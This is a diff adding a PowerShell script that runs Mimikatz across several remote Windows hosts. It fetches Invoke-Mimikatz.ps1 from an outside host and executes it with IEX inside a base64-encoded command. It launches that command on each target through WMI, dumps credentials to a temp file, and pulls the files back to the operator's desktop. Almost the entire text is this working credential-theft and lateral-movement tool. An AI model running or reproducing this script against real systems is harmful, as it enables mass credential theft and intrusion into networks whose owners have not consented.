@@ -1,0 +1,23 @@
+# Mass mimikatz on remote servers sharing the same admin account as the machine launching this script (ideal being the same local administrator account)
+# If you want to use different credentials, pass them as parameters to invoke-wmimethod
+# Beware of UAC otherwise this script needs some alterations
+# Requirement: RPC ports open on remote ports.
+
+$command = '$browser = New-Object System.Net.WebClient;IEX($browser.DownloadString("http://192.168.1.46:443/Invoke-Mimikatz.ps1"));$machine_name = (get-netadapter | get-netipaddress | ? addressfamily -eq "IPv4").ipaddress;invoke-mimikatz | out-file c:\windows\temp\$machine_name".txt"'
+
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+$encodedCommand = [Convert]::ToBase64String($bytes)
+
+$PC_IP = @("10.10.20.229", "10.10.20.97")
+
+
+ForEach ($X in $PC_IP) {
+
+$proc = invoke-wmimethod -ComputerName $X win32_process -name create -argumentlist ("powershell -encodedcommand $encodedCommand")
+$proc_id = $proc.processId
+
+do {(Write-Host "[*] Waiting for mimi to finish on $X"),(Start-Sleep -Seconds 2)}
+until ((Get-WMIobject -Class Win32_process -Filter "ProcessId=$proc_id" -ComputerName $X | where {$_.ProcessId -eq $proc_id}).ProcessID -eq $null)
+move-item -path "\\$X\C$\windows\temp\$X.txt" -Destination C:\users\Administrator\desktop\ -force
+write-host "[+] Got file for $X" -foregroundcolor "green"
+}
